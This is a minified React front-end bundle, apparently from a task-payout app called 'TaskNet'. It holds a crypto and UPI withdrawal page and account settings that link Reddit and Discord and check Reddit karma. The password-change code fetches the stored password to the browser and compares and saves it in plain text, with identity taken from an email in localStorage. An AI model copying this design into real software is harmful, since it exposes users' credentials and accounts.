rounded-xl border transition-all ${L===O.id?"bg-white text-blue-600 border-white shadow-lg":"bg-white/10 text-white border-white/10 hover:bg-white/20"}`,children:[n.jsx("img",{src:Zt[O.type],alt:"",className:"w-3.5 h-3.5 sm:w-4 sm:h-4 object-contain"}),n.jsx("span",{className:"text-[10px] sm:text-xs font-bold",children:O.label})]},O.id))})]}),n.jsxs("button",{onClick:D,disabled:R||e<1||i.length===0,className:"w-full sm:w-auto px-6 py-3.5 sm:px-8 sm:py-4 bg-white text-blue-600 rounded-2xl font-bold text-sm hover:shadow-xl hover:shadow-blue-900/40 transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed",children:[R?"Processing...":"Withdraw Funds",n.jsx(Kg,{size:18})]})]}),n.jsx("div",{className:"absolute bottom-[-20%] right-[-5%] w-48 h-48 sm:w-64 sm:h-64 bg-white/10 rounded-full blur-3xl"})]}),n.jsxs("div",{className:"bg-white/[0.02] border border-white/5 rounded-3xl p-6 md:p-8",children:[n.jsxs("h3",{className:"text-lg font-bold mb-6 flex items-center gap-2",children:[n.jsx(ol,{size:20,className:"text-blue-500"}),"Payout Methods"]}),n.jsxs("div",{className:"space-y-3",children:[i.map(O=>n.jsx("div",{className:"p-4 bg-white/[0.02] border border-white/5 rounded-2xl hover:border-white/10 transition-all",children:n.jsxs("div",{className:"flex items-center gap-3",children:[n.jsx("div",{className:"w-10 h-10 md:w-12 md:h-12 bg-white rounded-xl flex items-center justify-center flex-shrink-0 p-2",children:n.jsx("img",{src:Zt[O.type],alt:O.label,className:"w-full h-full object-contain"})}),n.jsxs("div",{className:"flex-1 min-w-0",children:[n.jsx("p",{className:"text-xs font-bold text-gray-400 uppercase tracking-wider mb-0.5",children:O.label}),n.jsx("p",{className:"text-sm font-bold text-white truncate",children:O.value})]}),n.jsxs("div",{className:"flex items-center gap-1 flex-shrink-0",children:[n.jsx("button",{onClick:()=>ze(O),className:"p-2 text-gray-500 hover:text-blue-500 hover:bg-blue-500/10 rounded-xl transition-all",title:"Edit",children:n.jsx(ju,{size:16})}),n.jsx("button",{onClick:()=>Ge(O),className:"p-2 text-gray-500 hover:text-red-500 hover:bg-red-500/10 rounded-xl transition-all",title:"Remove",children:n.jsx(Lr,{size:16})})]})]})},O.id)),i.length===0?n.jsxs("div",{className:"p-4 border border-dashed border-white/10 rounded-2xl flex flex-col items-center justify-center text-center py-10",children:[n.jsx("p",{className:"text-gray-500 text-xs mb-4",children:"No payout methods linked."}),n.jsxs("button",{onClick:()=>c(!0),className:"text-blue-500 text-xs font-bold hover:underline flex items-center gap-1",children:[n.jsx(Di,{size:14}),"Add Method"]})]}):n.jsx(n.Fragment,{children:i.length<3&&n.jsxs("button",{onClick:()=>c(!0),className:"w-full p-4 border border-dashed border-white/10 rounded-2xl text-blue-500 text-xs font-bold hover:border-blue-500/30 hover:bg-blue-500/5 transition-all flex items-center justify-center gap-2",children:[n.jsx(Di,{size:14}),"Add Another Payout Method"]})})]})]})]}),n.jsxs("section",{className:"bg-white/[0.02] border border-white/5 rounded-3xl overflow-hidden",children:[n.jsxs("div",{className:"p-8 border-b border-white/5 flex items-center justify-between",children:[n.jsxs("h2",{className:"text-xl font-bold flex items-center gap-3",children:[n.jsx(Yg,{size:20,className:"text-gray-500"}),"Transaction History"]}),n.jsx("select",{className:"bg-transparent text-sm text-gray-500 focus:outline-none",children:n.jsx("option",{children:"Last 30 days"})})]}),n.jsx("div",{className:"overflow-x-auto",children:n.jsxs("table",{className:"w-full text-left",children:[n.jsx("thead",{children:n.jsxs("tr",{className:"border-b border-white/5 text-xs font-bold text-gray-500 uppercase tracking-wider",children:[n.jsx("th",{className:"py-5 px-8",children:"Transaction ID"}),n.jsx("th",{className:"py-5 px-8",children:"Date"}),n.jsx("th",{className:"py-5 px-8",children:"Method"}),n.jsx("th",{className:"py-5 px-8 text-right",children:"Amount"}),n.jsx("th",{className:"py-5 px-8 text-right",children:"Status"})]})}),n.jsx("tbody",{children:G.length>0?G.map((O,X)=>n.jsxs("tr",{className:"border-b border-white/5 text-sm hover:bg-white/[0.01] transition-colors",children:[n.jsx("td",{className:"py-5 px-8 font-mono text-xs text-blue-500",children:O.transaction_id}),n.jsx("td",{className:"py-5 px-8 text-gray-400",children:new Date(O.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"})}),n.jsx("td",{className:"py-5 px-8",children:n.jsxs("div",{className:"flex items-center gap-2",children:[n.jsx("img",{src:Zt[O.payout_method.type],alt:"",className:"w-4 h-4 object-contain"}),n.jsx("span",{className:"text-xs text-gray-300",children:O.payout_method.label})]})}),n.jsxs("td",{className:"py-5 px-8 text-right font-bold text-white",children:["$",O.amount.toFixed(2)]}),n.jsx("td",{className:"py-5 px-8 text-right",children:n.jsx("span",{className:`text-[10px] font-black uppercase tracking-widest px-2 py-1 rounded ${O.status==="completed"?"bg-emerald-500/10 text-emerald-500":O.status==="rejected"?"bg-red-500/10 text-red-500":"bg-amber-500/10 text-amber-500"}`,children:O.status})})]},X)):n.jsx("tr",{children:n.jsx("td",{colSpan:5,className:"py-32 px-8",children:n.jsxs("div",{className:"flex flex-col items-center justify-center text-center",children:[n.jsx("div",{className:"w-16 h-16 bg-white/[0.03] rounded-full flex items-center justify-center mb-6",children:n.jsx(Wm,{size:32,className:"text-gray-600"})}),n.jsx("h3",{className:"text-lg font-bold mb-2",children:"No transactions"}),n.jsx("p",{className:"text-gray-500 text-sm max-w-xs",children:"Your transaction history will appear here once you make your first withdrawal."})]})})})})]})})]})]}),o&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-[32px] p-6 md:p-8 shadow-2xl animate-in zoom-in duration-300 max-h-[90vh] overflow-y-auto",children:[n.jsxs("div",{className:"flex items-center justify-between mb-6",children:[n.jsx("h2",{className:"text-xl font-black tracking-tight uppercase",children:"Add Payout Method"}),n.jsx("button",{onClick:Ne,className:"p-2 hover:bg-white/10 rounded-xl transition-colors",children:n.jsx(re,{size:20})})]}),v?n.jsxs("div",{className:"space-y-6",children:[n.jsxs("div",{className:"flex items-center gap-3 p-4 bg-white/[0.02] border border-white/5 rounded-2xl",children:[n.jsx("div",{className:"w-10 h-10 bg-white rounded-xl flex items-center justify-center p-2",children:n.jsx("img",{src:Zt[v],alt:Ja[v],className:"w-full h-full object-contain"})}),n.jsxs("div",{children:[n.jsx("p",{className:"font-bold text-white",children:Ja[v]}),n.jsx("button",{onClick:()=>f(null),className:"text-xs text-blue-500 hover:underline",children:"Change method"})]})]}),n.jsxs("div",{className:"space-y-2",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:Ja[v]}),n.jsx("input",{type:"text",autoFocus:!0,placeholder:ue(v),value:w,onChange:O=>j(O.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]}),n.jsxs("div",{className:"flex gap-3",children:[n.jsx("button",{onClick:Ne,className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),n.jsx("button",{onClick:te,disabled:!w.trim()||C,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 disabled:opacity-50 disabled:cursor-not-allowed",children:C?"Saving...":"Add Method"})]})]}):n.jsxs("div",{className:"space-y-3",children:[n.jsx("p",{className:"text-gray-500 text-sm mb-4",children:"Select a payout method:"}),n.jsxs("button",{onClick:()=>f("binance"),disabled:i.some(O=>O.type==="binance"),className:"w-full p-4 bg-white/[0.02] border border-white/5 rounded-2xl hover:border-amber-500/30 hover:bg-amber-500/5 transition-all flex items-center gap-4 disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:border-white/5 disabled:hover:bg-transparent",children:[n.jsx("div",{className:"w-12 h-12 bg-white rounded-xl flex items-center justify-center p-2",children:n.jsx("img",{src:Zt.binance,alt:"Binance",className:"w-full h-full object-contain"})}),n.jsxs("div",{className:"text-left",children:[n.jsx("p",{className:"font-bold text-white",children:"Binance ID"}),n.jsx("p",{className:"text-xs text-gray-500",children:"Pay via Binance Pay"})]}),i.some(O=>O.type==="binance")&&n.jsx("span",{className:"ml-auto text-[10px] font-bold text-emerald-500 bg-emerald-500/10 px-2 py-1 rounded",children:"ADDED"})]}),n.jsxs("button",{onClick:()=>f("usdt"),disabled:i.some(O=>O.type==="usdt"),className:"w-full p-4 bg-white/[0.02] border border-white/5 rounded-2xl hover:border-emerald-500/30 hover:bg-emerald-500/5 transition-all flex items-center gap-4 disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:border-white/5 disabled:hover:bg-transparent",children:[n.jsx("div",{className:"w-12 h-12 bg-white rounded-xl flex items-center justify-center p-2",children:n.jsx("img",{src:Zt.usdt,alt:"USDT",className:"w-full h-full object-contain"})}),n.jsxs("div",{className:"text-left",children:[n.jsx("p",{className:"font-bold text-white",children:"USDT Wallet"}),n.jsx("p",{className:"text-xs text-gray-500",children:"TRC20 Network Address"})]}),i.some(O=>O.type==="usdt")&&n.jsx("span",{className:"ml-auto text-[10px] font-bold text-emerald-500 bg-emerald-500/10 px-2 py-1 rounded",children:"ADDED"})]}),n.jsxs("button",{onClick:()=>f("upi"),disabled:i.some(O=>O.type==="upi"),className:"w-full p-4 bg-white/[0.02] border border-white/5 rounded-2xl hover:border-purple-500/30 hover:bg-purple-500/5 transition-all flex items-center gap-4 disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:border-white/5 disabled:hover:bg-transparent",children:[n.jsx("div",{className:"w-12 h-12 bg-white rounded-xl flex items-center justify-center p-2",children:n.jsx("img",{src:Zt.upi,alt:"UPI",className:"w-full h-full object-contain"})}),n.jsxs("div",{className:"text-left",children:[n.jsx("p",{className:"font-bold text-white",children:"UPI ID"}),n.jsx("p",{className:"text-xs text-gray-500",children:"Indian Payment Network"})]}),i.some(O=>O.type==="upi")&&n.jsx("span",{className:"ml-auto text-[10px] font-bold text-emerald-500 bg-emerald-500/10 px-2 py-1 rounded",children:"ADDED"})]})]})]})}),u&&y&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-[32px] p-6 md:p-8 shadow-2xl animate-in zoom-in duration-300",children:[n.jsxs("div",{className:"flex items-center justify-between mb-6",children:[n.jsxs("h2",{className:"text-xl font-black tracking-tight uppercase",children:["Edit ",y.label]}),n.jsx("button",{onClick:F,className:"p-2 hover:bg-white/10 rounded-xl transition-colors",children:n.jsx(re,{size:20})})]}),n.jsxs("div",{className:"space-y-6",children:[n.jsxs("div",{className:"flex items-center gap-3 p-4 bg-white/[0.02] border border-white/5 rounded-2xl",children:[n.jsx("div",{className:"w-10 h-10 bg-white rounded-xl flex items-center justify-center p-2",children:n.jsx("img",{src:Zt[y.type],alt:y.label,className:"w-full h-full object-contain"})}),n.jsx("p",{className:"font-bold text-white",children:y.label})]}),n.jsxs("div",{className:"space-y-2",children:[n.jsx("label",{className:"text-xs font-bold text-gray-500 uppercase tracking-widest ml-1",children:y.label}),n.jsx("input",{type:"text",autoFocus:!0,placeholder:ue(y.type),value:w,onChange:O=>j(O.target.value),className:"w-full px-5 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]}),n.jsxs("div",{className:"flex gap-3",children:[n.jsx("button",{onClick:F,className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),n.jsx("button",{onClick:oe,disabled:!w.trim()||C,className:"flex-1 py-4 bg-blue-600 text-white rounded-2xl font-black text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 disabled:opacity-50 disabled:cursor-not-allowed",children:C?"Saving...":"Save Changes"})]})]})]})}),p&&g&&n.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:n.jsxs("div",{className:"w-full max-w-sm bg-[#0a0a0a] border border-white/10 rounded-[32px] p-6 md:p-8 shadow-2xl animate-in zoom-in duration-300 text-center",children:[n.jsx("div",{className:"w-16 h-16 bg-red-600/10 rounded-2xl flex items-center justify-center mx-auto mb-6 border border-red-500/20",children:n.jsx(Lr,{className:"text-red-500",size:28})}),n.jsx("h2",{className:"text-xl font-black tracking-tight mb-2",children:"Remove Method?"}),n.jsxs("p",{className:"text-gray-500 text-sm mb-6",children:["Are you sure you want to remove your ",n.jsx("span",{className:"text-white font-bold",children:g.label}),"? This action cannot be undone."]}),n.jsxs("div",{className:"flex items-center gap-3 p-4 bg-white/[0.02] border border-white/5 rounded-2xl mb-6",children:[n.jsx("div",{className:"w-10 h-10 bg-white rounded-xl flex items-center justify-center p-2",children:n.jsx("img",{src:Zt[g.type],alt:g.label,className:"w-full h-full object-contain"})}),n.jsxs("div",{className:"text-left flex-1 min-w-0",children:[n.jsx("p",{className:"text-xs text-gray-500",children:g.label}),n.jsx("p",{className:"text-sm font-bold text-white truncate",children:g.value})]})]}),n.jsxs("div",{className:"flex gap-3",children:[n.jsx("button",{onClick:ce,className:"flex-1 py-4 bg-white/[0.03] border border-white/10 text-gray-400 rounded-2xl font-bold text-sm hover:text-white hover:bg-white/5 transition-all",children:"Cancel"}),n.jsx("button",{onClick:yt,disabled:C,className:"flex-1 py-4 bg-red-600 text-white rounded-2xl font-black text-sm hover:bg-red-700 transition-all shadow-lg shadow-red-600/20 disabled:opacity-50",children:C?"Removing...":"Remove"})]})]})})]})},qw=()=>{const e=St(),[t,r]=b.useState("Personal Settings"),[s,a]=b.useState(ft("user_email")||localStorage.getItem("user_email")||""),[i,l]=b.useState(""),[o,c]=b.useState(""),[u,h]=b.useState(""),[p,x]=b.useState(""),[v,f]=b.useState(null),[w,j]=b.useState(null),[y,m]=b.useState(!1),[g,k]=b.useState(!1),[C,S]=b.useState(!1),[R,T]=b.useState(!1),[L,$]=b.useState(""),[G,fe]=b.useState(""),[se,J]=b.useState(""),[B,ie]=b.useState(!1),[ne,I]=b.useState({show:!1,message:"",type:"info"}),D=(F,ce="info")=>{I({show:!0,message:F,type:ce}),setTimeout(()=>I(ue=>({...ue,show:!1})),2e3)};b.useEffect(()=>{te()},[]),b.useEffect(()=>{o&&W(o)},[o]);const W=async F=>{if(F){T(!0),j(null);try{let ce,ue;try{ce=await fetch(`https://www.reddit.com/user/${F}/about.json`,{headers:{Accept:"application/json"}})}catch{const X=`https://www.reddit.com/user/${F}/about.json`;ce=await fetch(`https://corsproxy.io/?${encodeURIComponent(X)}`,{headers:{Accept:"application/json"}})}if(ce.status===404)j("not_found"),f(null);else if(ce.status===403)j("suspended"),f(null);else if(ce.ok)if(ue=await ce.json(),ue&&ue.data){const O=ue.data;if(O.is_suspended===!0)j("suspended"),f(null);else if(O.subreddit&&O.subreddit.subreddit_type==="user"){j("active");const X=O.total_karma??(O.link_karma+O.comment_karma||0);f(X)}else{j("active");const X=O.total_karma??(O.link_karma+O.comment_karma||0);f(X)}}else ue&&ue.error,j("not_found"),f(null);else j("not_found"),f(null)}catch{j("not_found"),f(null)}T(!1)}},te=async()=>{if(!s)return;const{data:F,error:ce}=await z.from("profiles").select("*").eq("email",s).single();F&&(l(F.server_username||""),c(F.reddit_username||""),h(F.reddit_link||""),x(F.discord_username||""),F.server_username&&m(!0),F.reddit_username&&k(!0))},oe=async()=>{if(w&&w!=="active"){D(`Cannot link a ${w} account.`,"error");return}if(S(!0),o&&!g){const{data:ce}=await z.from("profiles").select("email").eq("reddit_username",o).neq("email",s).single();if(ce){D("This Reddit account is already linked to another TaskNet user.","error"),S(!1);return}}const{error:F}=await z.from("profiles").upsert({email:s,server_username:i,reddit_username:o,reddit_link:u,discord_username:p,updated_at:new Date().toISOString()},{onConflict:"email"});F?D("Error saving profile: "+F.message,"error"):(D("Profile updated successfully!","success"),i&&m(!0),o&&k(!0)),S(!1)},yt=()=>{localStorage.removeItem("user_email"),e("/welcome")},ze=async()=>{if(!L||!G||!se){D("Please fill in all password fields.","error");return}if(G!==se){D("New passwords do not match.","error");return}if(G.length<6){D("New password must be at least 6 characters.","error");return}ie(!0);const{data:F,error:ce}=await z.from("profiles").select("password").eq("email",s).single();if(ce||!F){D("Error verifying current password.","error"),ie(!1);return}if(F.password!==L){D("Current password is incorrect.","error"),ie(!1);return}const{error:ue}=await z.from("profiles").update({password:G,updated_at:new Date().toISOString()}).eq("email",s);ue?D("Error updating password: "+ue.message,"error"):(D("Password changed successfully!","success"),$(""),fe(""),J("")),ie(!1)},Ge=[{icon:n.jsx(lr,{size:18}),label:"Personal Settings"},{icon:n.jsx($t,{size:18}),label:"Change Password"},{icon:n.jsx(ui,{size:18}),label:"Social Integration"}],Ne=()=>{switch(t){case"Personal Settings":return n.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-2 duration-300",children:[n.jsx("h3",{className:"text-xl font-bold mb-6",children:"Personal Settings"}),n.jsx("div",{className:"max-w-xl space-y-6",children:n.jsxs("div",{className:"space-y-6",children:[n.jsxs("div",{children:[n.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Email Address"}),n.jsxs("div",{className:"relative",children:[n.jsx(qm,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500",size:16}),n.jsx("input",{type:"email",readOnly:!0,value:s,className:"w-full pl-12 pr-4 py-3 bg-white/[0.01] border border-white/5 rounded-xl text-gray-500 text-sm cursor-not-allowed outline-none"})]})]}),n.jsxs("div",{children:[n.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Server Username"}),n.jsxs("div",{className:"relative group",children:[n.jsx(lr,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:16}),n.jsx("input",{type:"text",placeholder:"Enter your server username",value:i,readOnly:y,onChange:F=>l(F.target.value),className:`w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none transition-all text-sm outline-none ${y?"cursor-not-allowed text-gray-500 border-none opacity-60":"focus:border-blue-500"}`}),y&&n.jsxs("div",{className:"absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-1.5 px-2.5 py-1 bg-white/5 rounded-lg border border-white/5",children:[n.jsx($t,{size:10,className:"text-gray-500"}),n.jsx("span",{className:"text-[9px] font-black text-gray-500 uppercase tracking-widest",children:"Locked"})]})]})]})]})})]});case"Social Integration":return n.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-2 duration-300",children:[n.jsx("h3",{className:"text-xl font-bold mb-1",children:"Social Integration"}),n.jsx("p",{className:"text-gray-500 text-sm mb-8",children:"Link your socials here"}),n.jsxs("div",{className:"max-w-xl space-y-8",children:[n.jsxs("div",{className:"space-y-4",children:[n.jsx("label",{className:"block text-[10px] font-black text-gray-600 uppercase tracking-[0.2em] ml-1",children:"Linked Accounts"}),o&&u&&(R||w)?n.jsxs("div",{className:"p-5 bg-[#0a0a0a] border border-white/5 rounded-3xl flex items-center justify-between group hover:border-white/10 transition-all shadow-xl",children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"w-12 h-12 bg-[#FF4500]/10 rounded-2xl flex items-center justify-center border border-[#FF4500]/20",children:n.jsx("svg",{viewBox:"0 0 24 24",className:"w-7 h-7 fill-[#FF4500]",xmlns:"http://www.w3.org/2000/svg",children:n.jsx("path",{d:"M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.051l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.945 0 1.712.767 1.712 1.712 0 .593-.306 1.11-.764 1.398.032.183.051.369.051.563 0 2.315-2.72 4.192-6.075 4.192-3.354 0-6.074-1.877-6.074-4.192 0-.194.02-.38.051-.563a1.712 1.712 0 0 1-1.114-2.622c.307-.31.73-.491 1.207-.491.478 0 .901.182 1.207.491 1.194-.856 2.85-1.419 4.674-1.488l.82-3.818a.312.312 0 0 1 .37-.243l2.672.567c.058-.051.126-.093.197-.122zm-6.11 7.115c-.631 0-1.145.513-1.145 1.145s.514 1.145 1.145 1.145c.632 0 1.145-.513 1.145-1.145s-.513-1.145-1.145-1.145zm4.22 0c-.632 0-1.145.513-1.145 1.145s.513 1.145 1.145 1.145c.631 0 1.145-.513 1.145-1.145s-.514-1.145-1.145-1.145zm-4.22 3.183c-.11 0-.213.044-.29.121-.423.422-1.328.462-1.62.462a.41.31 0 1 0 0 .82c.728 0 1.938-.11 2.546-.718a.41.41 0 0 0-.636-.585zm4.22 0c-.11 0-.213.044-.29.121-.423.422-1.328.462-1.62.462a.41.31 0 1 0 0 .82c.728 0 1.938-.11 2.546-.718a.41.41 0 0 0-.636-.585z"})})}),n.jsxs("div",{children:[n.jsxs("p",{className:"text-[15px] font-black text-white tracking-tight",children:["u/",o]}),n.jsx("div",{className:"flex items-center gap-2 mt-0.5 min-h-[16px]",children:R?n.jsx("span",{className:"text-[10px] font-black text-blue-500 uppercase tracking-widest animate-pulse",children:"Checking Account..."}):w?n.jsx(n.Fragment,{children:w==="active"?n.jsxs(n.Fragment,{children:[n.jsxs("span",{className:"text-[11px] font-bold text-gray-500",children:[(v==null?void 0:v.toLocaleString())||"---"," karma"]}),n.jsx("span",{className:"text-gray-700",children:""}),n.jsxs("span",{className:"text-[10px] font-black text-emerald-500 uppercase tracking-widest flex items-center gap-1.5",children:[n.jsx("div",{className:"w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.5)]"}),"Active"]})]}):n.jsxs("span",{className:`text-[10px] font-black uppercase tracking-widest flex items-center gap-1.5 ${w==="suspended"||w==="banned"?"text-red-500":"text-gray-500"}`,children:[n.jsx("div",{className:`w-1.5 h-1.5 rounded-full ${w==="suspended"||w==="banned"?"bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.5)]":"bg-gray-500"}`}),w.replace("_"," ")]})}):null})]})]}),!g&&n.jsx("button",{onClick:()=>{h(""),c(""),f(null),j(null)},className:"px-4 py-2 text-[10px] font-black text-red-500/60 hover:text-red-500 hover:bg-red-500/5 rounded-xl uppercase tracking-[0.2em] transition-all",children:"UNLINK"}),g&&n.jsxs("div",{className:"flex items-center gap-1.5 px-3 py-1.5 bg-white/5 rounded-xl border border-white/5",children:[n.jsx($t,{size:12,className:"text-gray-600"}),n.jsx("span",{className:"text-[9px] font-black text-gray-600 uppercase tracking-widest",children:"Permanent"})]})]}):n.jsxs("div",{className:"p-10 border border-dashed border-white/5 rounded-[32px] flex flex-col items-center justify-center text-center bg-white/[0.01]",children:[n.jsx("div",{className:"w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center mb-4 border border-white/5",children:n.jsx(ui,{className:"text-gray-600",size:24})}),n.jsx("p",{className:"text-gray-500 text-xs font-medium",children:"No accounts integrated yet."})]})]}),n.jsx("div",{className:"h-[1px] bg-white/5 mx-2"}),n.jsxs("div",{className:"space-y-6",children:[n.jsxs("div",{children:[n.jsxs("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-3 tracking-widest ml-1 flex items-center justify-between",children:[n.jsx("span",{children:"Reddit Profile Link"}),!g&&n.jsx("span",{className:"text-[9px] font-black text-amber-500 uppercase tracking-tighter bg-amber-500/10 px-2 py-0.5 rounded-md animate-pulse",children:"Action Required"})]}),!g&&n.jsxs("div",{className:"mb-4 p-4 bg-amber-500/5 border border-amber-500/20 rounded-2xl flex gap-3 items-start animate-in fade-in slide-in-from-top-2 duration-500",children:[n.jsx(Ee,{size:16,className:"text-amber-500 mt-0.5 shrink-0"}),n.jsxs("p",{className:"text-[11px] leading-relaxed text-amber-500/80 font-medium",children:[n.jsx("span",{className:"font-bold text-amber-500 uppercase mr-1",children:"Permanent Binding:"}),"Once you apply changes, this Reddit account will be ",n.jsx("span",{className:"text-amber-500 underline decoration-2",children:"permanently locked"})," to your profile. You cannot change, reroll, or unlink it later. Please ensure the link is 100% correct."]})]}),n.jsxs("div",{className:"relative group",children:[n.jsx(ui,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-[#FF4500] transition-colors",size:16}),n.jsx("input",{type:"url",placeholder:"https://www.reddit.com/user/username",value:u,readOnly:g,onChange:F=>{if(g)return;const ce=F.target.value.trim();h(ce);const ue=ce.match(/^https?:\/\/(www\.)?reddit\.com\/(u|user)\/([a-zA-Z0-9_-]+)/i);ue&&ue[3]?c(ue[3]):(c(""),j(null),f(null))},className:`w-full pl-12 pr-4 py-4 bg-white/[0.03] border border-white/5 rounded-2xl focus:outline-none transition-all text-sm outline-none placeholder:text-gray-700 ${g?"cursor-not-allowed text-gray-500 border-none opacity-60":"focus:border-[#FF4500]"}`}),g&&n.jsxs("div",{className:"absolute right-4 top-1/2 -translate-y-1/2 flex items-center gap-1.5 px-3 py-1.5 bg-white/5 rounded-xl border border-white/5",children:[n.jsx($t,{size:12,className:"text-gray-500"}),n.jsx("span",{className:"text-[9px] font-black text-gray-500 uppercase tracking-widest",children:"Locked"})]})]})]}),n.jsxs("div",{children:[n.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Discord Username"}),n.jsxs("div",{className:"relative group",children:[n.jsx(Ut,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-[#5865F2] transition-colors",size:16}),n.jsx("input",{type:"text",placeholder:"username#0000",value:p,onChange:F=>x(F.target.value),className:"w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-[#5865F2] transition-all text-sm outline-none"})]})]})]})]})]});case"Change Password":return n.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-2 duration-300",children:[n.jsx("h3",{className:"text-xl font-bold mb-2",children:"Change Password"}),n.jsx("p",{className:"text-gray-500 text-sm mb-8",children:"Update your account password securely."}),n.jsxs("div",{className:"max-w-xl space-y-6",children:[n.jsxs("div",{children:[n.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Current Password"}),n.jsxs("div",{className:"relative group",children:[n.jsx($t,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:16}),n.jsx("input",{type:"password",placeholder:"Enter current password",value:L,onChange:F=>$(F.target.value),className:"w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),n.jsxs("div",{children:[n.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"New Password"}),n.jsxs("div",{className:"relative group",children:[n.jsx($t,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:16}),n.jsx("input",{type:"password",placeholder:"Enter new password",value:G,onChange:F=>fe(F.target.value),className:"w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),n.jsxs("div",{children:[n.jsx("label",{className:"block text-xs font-bold text-gray-500 uppercase mb-2 tracking-widest",children:"Confirm New Password"}),n.jsxs("div",{className:"relative group",children:[n.jsx($t,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 group-focus-within:text-blue-500 transition-colors",size:16}),n.jsx("input",{type:"password",placeholder:"Confirm new password",value:se,onChange:F=>J(F.target.value),className:"w-full pl-12 pr-4 py-3 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})]}),n.jsx("button",{onClick:ze,disabled:B,className:"w-full py-3 bg-blue-600 text-white rounded-xl font-bold text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-all shadow-lg shadow-blue-600/20",children:B?"Updating Password...":"Update Password"})]})]});default:return null}};return n.jsxs(hr,{children:[n.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${ne.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:n.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${ne.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":ne.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[n.jsxs("div",{className:"flex items-center gap-4",children:[n.jsx("div",{className:"flex-shrink-0",children:ne.type==="success"?n.jsx(Fe,{size:24,strokeWidth:3}):ne.type==="error"?n.jsx(re,{size:24,strokeWidth:3}):n.jsx(Ee,{size:24,strokeWidth:3})}),n.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:ne.message})]}),n.jsx("button",{onClick:()=>I(F=>({...F,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full 